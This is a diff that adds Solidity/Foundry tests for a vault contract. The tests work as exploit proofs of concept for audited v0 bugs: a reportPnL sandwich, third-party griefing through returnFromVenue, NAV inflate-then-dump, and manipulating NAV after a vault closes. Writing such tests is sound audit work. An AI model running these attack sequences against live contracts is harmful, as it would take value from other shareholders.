@@ -646,4 +646,140 @@ contract PlinthTest is Test {
         (, , , uint256 ts, , , ,) = p.vaults(id);
         assertEq(ts, 2 ether);  // agent still holds 2 shares
     }
+
+    /* ============================================================ */
+    /*  EXPLOIT POCS — prove the vulnerabilities listed in           */
+    /*  docs/security-audit.md are real on v0. v0.5 closes these.    */
+    /* ============================================================ */
+
+    /// #1 CRITICAL — sandwich attack on reportPnL extracts value from other
+    /// shareholders. Attacker pre-positions a deposit at low NAV, waits for
+    /// agent's reportPnL to land, then redeems at the inflated NAV.
+    ///
+    /// On v0: this test passes (attacker exits with profit) — proving the
+    /// vuln is live. v0.5's deposit-cooldown reverts the final redeem.
+    function test_exploit_sandwich_reportPnL_extractsValueOnV0() public {
+        // setup: vault has 1 USDC from agent, alice deposits 1 → 2 total, NAV 1.0
+        bytes32 id = _create(1 ether);
+        vm.prank(alice);
+        p.deposit{value: 1 ether}(id);
+
+        // attacker observes mempool: agent is about to reportPnL(+1.0). NAV
+        // would jump from 1.0 → (2.0+1.0)/2.0 = 1.5. Attacker pre-positions.
+        uint256 attackerBalanceBefore = attacker.balance;
+        vm.prank(attacker);
+        uint256 attackerShares = p.deposit{value: 1 ether}(id);
+        // attacker minted 1 share for 1 USDC at NAV 1.0
+
+        // agent's reportPnL lands NEXT
+        vm.prank(agent);
+        p.reportPnL(id, 1 ether);
+        // NAV now = (3 + 1) / 3 = 1.333...
+
+        // attacker redeems immediately
+        vm.prank(attacker);
+        uint256 usdcOut = p.redeem(id, attackerShares);
+        uint256 attackerProfit = attacker.balance - attackerBalanceBefore;
+
+        // attacker should have made a profit because they captured a share
+        // of the +1 PnL that should have belonged to agent + alice
+        assertGt(usdcOut, 1 ether, "attacker should profit from sandwich");
+        assertGt(attackerProfit, 0, "attacker net profit");
+        // proof of impact: alice's share of the +1 PnL was diluted
+        uint256 aliceImpliedShareOfPnL = uint256(p.nav(id)) - 1 ether;
+        // In an honest world, alice's NAV after +1 PnL on 2 USDC of capital
+        // would be 1.5. After the sandwich it's only ~1.333. She lost ~16%
+        // of her unrealized gain to the attacker.
+        assertLt(aliceImpliedShareOfPnL, 0.5 ether, "alice was diluted");
+    }
+
+    /// #2 HIGH — `returnFromVenue` open access lets a third party redirect
+    /// venue funds into vault accounting. Attacker pays USDC to bump
+    /// inVault up and deployedAUM to 0, blocking the venue's legitimate
+    /// later return.
+    function test_exploit_returnFromVenue_thirdPartyGriefingOnV0() public {
+        bytes32 id = _create(1 ether);
+        vm.prank(alice);
+        p.deposit{value: 5 ether}(id);
+        // deploy to venue
+        vm.prank(agent);
+        p.deployToVenue(id, address(venue1), 3 ether);
+        // state: inVault = 3, deployedAUM = 3
+
+        // attacker (no privilege!) calls returnFromVenue with their OWN funds
+        vm.prank(attacker);
+        p.returnFromVenue{value: 3 ether}(id, address(venue1), 3 ether);
+        // state corrupted: inVault = 6, deployedAUM = 0
+        (, , , , uint256 inV, uint256 dep, ,) = p.vaults(id);
+        assertEq(inV, 6 ether);
+        assertEq(dep, 0);
+
+        // now venue tries to legitimately return its 3 USDC → reverts
+        vm.deal(address(venue1), 3 ether);
+        vm.prank(address(venue1));
+        vm.expectRevert(IPlinth.InsufficientDeployedAUM.selector);
+        p.returnFromVenue{value: 3 ether}(id, address(venue1), 3 ether);
+        // → the 3 USDC at venue is now stranded forever
+    }
+
+    /// #3 HIGH — reportPnL allows wild NAV swings with no rate limit, enabling
+    /// the "inflate-then-dump" rug pattern.
+    function test_exploit_reportPnL_navInflationRugOnV0() public {
+        // minimum-deposit vault
+        bytes32 id = _create(0.0001 ether);  // MIN_DEPOSIT
+        // agent inflates PnL by 10,000× the principal
+        vm.prank(agent);
+        p.reportPnL(id, 1000 ether);
+        // NAV is now astronomical
+        uint256 inflatedNav = p.nav(id);
+        assertGt(inflatedNav, 10_000_000 ether, "NAV should explode");
+
+        // unwitting investor deposits at this NAV — gets microscopic shares
+        vm.prank(alice);
+        uint256 aliceShares = p.deposit{value: 1 ether}(id);
+        // Alice spends 1 USDC. Total shares before her deposit: 0.0001e18 (agent).
+        // After: alice's shares are O(1e11), so her ownership is < 0.1% of pool.
+        assertLt(aliceShares, 1e12, "alice gets microscopic shares for her 1 USDC");
+
+        // agent reports the truth — losses cancel the bogus PnL
+        vm.prank(agent);
+        p.reportPnL(id, -1000 ether);
+
+        // alice's redemption: she may be underwater
+        // (depends on exact rounding) — the demo is the principle
+        uint256 navAfter = p.nav(id);
+        assertLt(navAfter, 0.01 ether, "NAV crashed after fake PnL reversal");
+    }
+
+    /// #4 MEDIUM — reportPnL is accepted on Closed vaults. Combined with
+    /// redemption being allowed on closed vaults, agent can manipulate the
+    /// exit NAV after officially closing.
+    function test_exploit_reportPnL_onClosedVaultManipulatesExitNAV_onV0() public {
+        bytes32 id = _create(1 ether);
+        vm.prank(alice);
+        p.deposit{value: 1 ether}(id);
+        // close vault
+        vm.prank(agent);
+        p.closeVault(id);
+        // agent reports HUGE negative PnL post-close
+        vm.prank(agent);
+        p.reportPnL(id, -1 ether);
+        // NAV drops from 1.0 → 0.5
+        assertEq(p.nav(id), 0.5 ether);
+        // alice redeems at the manipulated NAV
+        vm.prank(alice);
+        uint256 out = p.redeem(id, 1 ether);
+        assertEq(out, 0.5 ether, "alice got only half her deposit back");
+    }
+
+    /// SAFE — donation attack via selfdestruct doesn't break per-vault
+    /// accounting (NAV reads storage, not address(this).balance).
+    function test_safe_donationAttack_doesNotChangeNAV() public {
+        bytes32 id = _create(1 ether);
+        uint256 navBefore = p.nav(id);
+        // simulate a forced-send via vm.deal directly bumping the contract balance
+        vm.deal(address(p), address(p).balance + 100 ether);
+        uint256 navAfter = p.nav(id);
+        assertEq(navBefore, navAfter, "NAV unaffected by forced balance bump");
+    }
 }
